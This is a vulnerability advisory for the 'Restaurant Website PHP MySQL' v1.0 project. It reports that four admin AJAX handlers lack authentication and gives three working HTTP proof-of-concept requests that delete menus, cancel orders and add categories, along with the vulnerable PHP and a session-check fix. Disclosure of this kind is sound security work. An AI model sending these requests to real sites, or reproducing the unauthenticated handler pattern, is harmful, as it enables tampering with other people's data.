# Restaurant Website PHP MySQL v1.0 - Missing Authentication in Administrative AJAX Endpoints

## submitter

Fklov

## Vendor

Restaurant Website PHP MySQL

Vendor Homepage:
https://github.com/jairiidriss/restaurant-website-php-mysql

## Affected Version

* Restaurant Website PHP MySQL v1.0

## Vulnerability Type

Missing Authentication for Critical Function

## Affected Files

* `/admin/ajax_files/menus_ajax.php`
* `/admin/ajax_files/dashboard_ajax.php`
* `/admin/ajax_files/menu_categories_ajax.php`
* `/admin/ajax_files/gallery_ajax.php`

## Description

Restaurant Website PHP MySQL v1.0 contains a missing authentication vulnerability in multiple administrative AJAX endpoints under `/admin/ajax_files/`.

The affected files perform sensitive administrative actions such as deleting menus, modifying order states, managing menu categories, and uploading gallery images without validating administrator sessions.

While the main administrative pages correctly enforce session-based authentication, the corresponding AJAX handlers contain no authentication or authorization checks and directly process attacker-controlled POST requests.

A remote unauthenticated attacker can directly invoke these endpoints to perform unauthorized administrative operations.

## Impact

An unauthenticated remote attacker can:

* Delete menu items
* Cancel or mark orders as delivered
* Add or delete menu categories
* Upload arbitrary gallery images

This allows unauthorized manipulation of critical application data and administrative functionality without requiring valid administrator credentials.

## Proof of Concept

### PoC 1 - Unauthenticated Menu Deletion

```http
POST /admin/ajax_files/menus_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

do_=Delete&menu_id=1
```

Result:
The specified menu item is deleted without authentication.

### PoC 2 - Unauthenticated Order Cancellation

```http
POST /admin/ajax_files/dashboard_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

do_=Cancel_Order&order_id=10&cancellation_reason_order=hacked
```

Result:
The specified order is canceled without authentication.

### PoC 3 - Unauthenticated Category Addition

```http
POST /admin/ajax_files/menu_categories_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

do=Add&category_name=InjectedCategory
```

Result:
An attacker-controlled category is added successfully without authentication.

## Root Cause

The vulnerable AJAX handler files include database and helper function files directly but fail to initialize sessions or validate administrator authentication before processing sensitive operations.

Example vulnerable code:

```php
<?php include '../connect.php'; ?>
<?php include '../Includes/functions/functions.php'; ?>

<?php
if(isset($_POST['do_']) && $_POST['do_'] == "Delete")
{
    $menu_id = $_POST['menu_id'];
    $stmt = $con->prepare("DELETE from menus where menu_id = ?");
    $stmt->execute(array($menu_id));
}
?>
```

## Suggested Fix

Implement mandatory session authentication and authorization checks in all administrative AJAX handlers before processing requests.

Example:

```php
session_start();

if(!isset($_SESSION['username_restaurant_qRewacvAqzA']) ||
   !isset($_SESSION['password_restaurant_qRewacvAqzA']))
{
    http_response_code(403);
    exit('Unauthorized');
}
```
